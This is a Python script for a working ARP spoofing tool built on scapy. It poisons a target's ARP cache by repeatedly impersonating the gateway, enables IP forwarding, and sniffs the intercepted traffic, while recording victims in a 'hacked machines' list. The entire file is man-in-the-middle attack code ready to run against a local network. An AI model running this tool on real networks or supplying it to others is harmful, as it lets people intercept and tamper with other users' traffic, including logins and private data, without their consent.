import scapy
import netifaces as ni
import threading 
import time 
import binascii
import subprocess
from time import sleep
from scapy.all import *
import argparse
import os 
import sys

# Global variables
attacker_mac = ""
hacked_machines = []
verbose = False

# get the mac address by broadcasting ARP to target ip
def getMacAddress(ip)->str:

	target_mac 	= "ff:ff:ff:ff:ff:ff" # broadcast request 
	ether 		= Ether(dst=target_mac)
	arp 		= ARP(pdst=ip) 
	
	packet = ether/arp
	
	result = srp(packet, timeout=7, verbose=False )[0] # use srp to send and recieve arp rq

	for sent, received in result:
        	return received.hwsrc
	pass


def print_status(message):
    """Print status messages if verbose mode is enabled."""
    if verbose:
        print(f"[*] {message}")

def print_success(message):
    """Print success messages."""
    print(f"[+] {message}")

def print_error(message):
    """Print error messages."""
    print(f"[!] {message}", file=sys.stderr)
 

def get_own_mac_address(interface):
    """
    Get the MAC address of a specific interface.
    
    Args:
        interface (str): The network interface.
        
    Returns:
        str: The MAC address of the interface.
    """
    return ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']

def spoof(target_ip, spoof_ip, attacker_mac, victim_mac):
    """
    Send ARP spoofing packets to target IP.
    
    Args:
        target_ip (str): The target IP address.
        spoof_ip (str): The IP to spoof (usually the gateway).
        attacker_mac (str): The MAC address of the attacker.
    """
    print_status(f"Spoofing {target_ip} ({victim_mac}) by pretending to be {spoof_ip}")
    ether = Ether(dst=victim_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=victim_mac, hwsrc=attacker_mac)

    if [target_ip, victim_mac] not in hacked_machines:
            hacked_machines.append([target_ip, victim_mac])
            print_success(f"Added {target_ip} to hacked machines list")
        
    packet = ether / arp
    sendp(packet, verbose=0)
    return

def packet_analyzer(packet):
    """
    Analyze intercepted packets.
    
    Args:
        packet: The packet to analyze.
    """
    print("Packet captured")
    print(packet.summary())
        
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def start_sniffer():
    """
    Start sniffing packets on the network.
    """
    print_status("Starting packet sniffer...")
    sniff( prn=packet_analyzer, filter=f"ether host {attacker_mac}")


def parse_arguments():
    """
    Parse command-line arguments.
    
    Returns:
        argparse.Namespace: The parsed arguments.
    """
    parser = argparse.ArgumentParser(description="ARP Spoofer - A tool for ARP spoofing attacks\nExample: sudo python3 ARP_POISION.py -i <interface> -t <target_ip> -g <gateway_ip>")
    
    parser.add_argument("-t", "--target", help="Target IP address", required=True)
    parser.add_argument("-g", "--gateway", help="Gateway IP address to spoof", required=True)
    parser.add_argument("-i", "--interface", help="Network interface to use", required=True)
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def main():
    """
    Main function to run the ARP spoofer.
    """
    global attacker_mac, verbose

    args = parse_arguments()
    verbose = args.verbose
    attacker_mac = get_own_mac_address(args.interface)

    print_success(f"Target IP: {args.target}")
    print_success(f"Gateway IP: {args.gateway}")
    print_success(f"Interface: {args.interface}")
    print_success(f"Attacker MAC: {attacker_mac}")    
    print_status("Starting ARP spoofing...")
    victim_mac = getMacAddress(args.target)
    def start_spoofing():
        while True:
            spoof(args.target, args.gateway, attacker_mac, victim_mac)
            sleep(2)

    spoof_thread = threading.Thread(
		target=start_spoofing)
    spoof_thread.start()

    print_status("Starting packet sniffer...")
    sniffer_thread = threading.Thread(target=start_sniffer)
    sniffer_thread.start()

main()
